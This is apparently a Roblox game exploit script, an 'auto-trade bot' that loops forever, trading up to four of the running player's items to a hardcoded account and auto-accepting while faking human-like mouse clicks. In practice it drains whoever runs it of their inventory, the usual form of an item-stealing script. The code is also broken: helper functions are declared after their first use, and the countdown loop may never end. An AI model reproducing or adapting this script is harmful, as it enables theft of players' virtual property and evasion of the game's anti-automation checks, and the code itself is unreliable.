-- Frame-Based Auto-Trade Bot
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 5 -- Seconds between trades
local ITEM_ADD_DELAY = 0.5 -- Delay between adding items
local SCROLL_DELAY = 0.5 -- Delay between scroll actions

-- Items to exclude
local EXCLUDED_ITEMS = {
    ["Default Knife"] = true,
    ["Default Gun"] = true
}

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- Trade state
local isTrading = false
local lastTradeTime = 0

-- Find player by name
local function findPlayer(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == name:lower() then
            return player
        end
    end
    return nil
end

-- Check if trade GUI is open
local function isTradeGUIOpen()
    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or 
           LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
end

-- Simulate realistic mouse click
local function simulateClick(button)
    if not button or not button:IsA("GuiButton") then return false end
    
    local absPos = button.AbsolutePosition
    local absSize = button.AbsoluteSize
    local centerX = absPos.X + absSize.X/2
    local centerY = absPos.Y + absSize.Y/2
    
    -- Human-like movement
    for i = 1, 3 do
        local offsetX = math.random(-10, 10)
        local offsetY = math.random(-10, 10)
        UserInputService:SendMouseMoveEvent(centerX + offsetX, centerY + offsetY)
        wait(0.05)
    end
    
    -- Final click
    UserInputService:SendMouseButtonEvent(centerX, centerY, 0, true, nil, 50)
    wait(0.1)
    UserInputService:SendMouseButtonEvent(centerX, centerY, 0, false, nil, 1)
    return true
end

-- Find all visible items in trade GUI
local function findTradeItems()
    local items = {}
    local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or 
                     LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
    
    if not tradeGui then return items end
    
    -- Try common inventory frame locations
    local inventoryFrames = {
        tradeGui:FindFirstChild("ItemsFrame"),
        tradeGui:FindFirstChild("Inventory"),
        tradeGui:FindFirstChild("Weapons"),
        tradeGui:FindFirstChild("Container"):FindFirstChild("Items")
    }
    
    for _, frame in pairs(inventoryFrames) do
        if frame then
            for _, item in ipairs(frame:GetDescendants()) do
                if (item:IsA("TextButton") or item:IsA("ImageButton")) and 
                   item.Visible and item.Active and not EXCLUDED_ITEMS[item.Name] then
                    table.insert(items, item)
                end
            end
        end
    end
    
    return items
end

-- Add items to trade
local function addItemsToTrade()
    -- Click "Add Items" button if exists
    local addButton = findGuiElement("TradeGUI > Container > AddItemsButton") or
                     findGuiElement("TradeGUI_Phone > Actions > AddItems")
    if addButton then
        simulateClick(addButton)
        wait(1)
    end
    
    local items = findTradeItems()
    if #items == 0 then
        warn("No tradable items found in GUI!")
        return false
    end
    
    -- Add up to MAX_ITEMS_PER_TRADE
    local added = 0
    for _, item in ipairs(items) do
        if added >= MAX_ITEMS_PER_TRADE then break end
        
        if simulateClick(item) then
            added = added + 1
            wait(ITEM_ADD_DELAY)
        end
    end
    
    return added > 0
end

-- Accept trade
local function acceptTrade()
    local acceptBtn = findGuiElement("TradeGUI > AcceptButton") or
                     findGuiElement("TradeGUI_Phone > Actions > Accept")
    
    if not acceptBtn then
        warn("Accept button not found!")
        return false
    end
    
    -- Wait for countdown if needed
    local countdown = 0
    while countdown < 5 do
        local timerText = findTradeText("^[1-5]$") -- Looks for numbers 1-5
        if timerText then
            countdown = tonumber(timerText.Text) or 0
        end
        wait(0.1)
    end
    
    simulateClick(acceptBtn)
    wait(0.5)
    return true
end

-- Main trade function
local function initiateTrade(targetPlayer)
    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then
        return
    end
    
    isTrading = true
    print("Starting trade with "..targetPlayer.Name)
    
    -- Send trade request
    TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    wait(1)
    
    if not isTradeGUIOpen() then
        warn("Trade GUI didn't open!")
        isTrading = false
        return
    end
    
    -- Add items
    if not addItemsToTrade() then
        isTrading = false
        return
    end
    
    -- Accept trade
    if not acceptTrade() then
        warn("Failed to accept trade!")
    else
        print("Trade completed with "..targetPlayer.Name)
    end
    
    isTrading = false
    lastTradeTime = os.time()
end

-- Helper function to find GUI elements
local function findGuiElement(path)
    local current = LocalPlayer.PlayerGui
    for part in path:gmatch("[^>]+") do
        current = current:FindFirstChild(part:match("^%s*(.-)%s*$"))
        if not current then return nil end
    end
    return current
end

-- Helper function to find text in trade GUI
local function findTradeText(pattern)
    local tradeGui = isTradeGUIOpen()
    if not tradeGui then return nil end
    
    for _, descendant in ipairs(tradeGui:GetDescendants()) do
        if (descendant:IsA("TextLabel") or descendant:IsA("TextButton")) and
           descendant.Text and descendant.Text:match(pattern) then
            return descendant
        end
    end
    return nil
end

-- Main loop
while true do
    local target = findPlayer(TARGET_PLAYER)
    if target then
        initiateTrade(target)
    else
        print(TARGET_PLAYER.." not found. Waiting...")
    end
    wait(5)
end
